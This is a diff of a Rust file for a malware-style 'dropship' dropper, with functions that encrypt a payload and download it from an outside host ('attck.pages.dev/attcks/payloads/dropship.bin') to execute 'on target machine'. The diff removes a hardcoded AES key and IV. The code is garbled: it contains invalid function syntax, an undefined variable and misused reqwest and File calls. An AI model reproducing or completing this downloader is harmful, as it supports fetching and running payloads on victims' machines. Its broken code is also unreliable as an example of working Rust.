@@ -5,34 +5,32 @@ use std::process::{Command, Stdio};
 // Function to generate AES256 encrypted dropship
 fn generate_encrypted_dropship() {
     // Generate AES256 key and IV (not shown in this example)
-    let key = "ff827540075736f397c113a5edcb5d93".as_bytes();
-    let iv = "8cJf6yKp5rEaBtDz".as_bytes();
 
     // Encrypt dropship using AES256
-    let encrypted_dropship = encrypt_using_aes(b"dropship", key, iv);
+    let encrypted_dropship = encrypt_using_aes(b"dropship");
 
     // Write the encrypted dropship to file
-    if let Err(e) = File::create("encrypted_dropship.bin") {
+    if let Err(e) = File::create("dropship.bin") {
         eprintln!("Error creating file: {}", e);
         return;
     }
-    if let Err(e) = File::write("encrypted_dropship.bin", encrypted_dropship) {
+    if let Err(e) = File::write("dropship.bin", dropship) {
         eprintln!("Error writing to file: {}", e);
         return;
     }
 }
 
 // Function to download and execute the encrypted dropship on target machine
-fn run_encrypted_dropship() {
+fn run dropship() {
     // Download the encrypted dropship file in chunks
     let mut client = reqwest::Client::new();
-    let mut file = File::open("encrypted_dropship.bin").expect("Unable to open file");
+    let mut file = File::open("dropship.bin").expect("Unable to open file");
     let mut chunk = vec![0; 1024]; // Assuming we're using 1KB chunks
 
     if let Err(e) = client.get("https://attck.pages.dev/attcks/payloads/dropship.bin")
         .send()
         .map(|response| response.copy_to(&mut chunk).text())
-        .save("encrypted_dropship.bin") {
+        .save("dropship.bin") {
         eprintln!("Error downloading file: {}", e);
         return;
     }
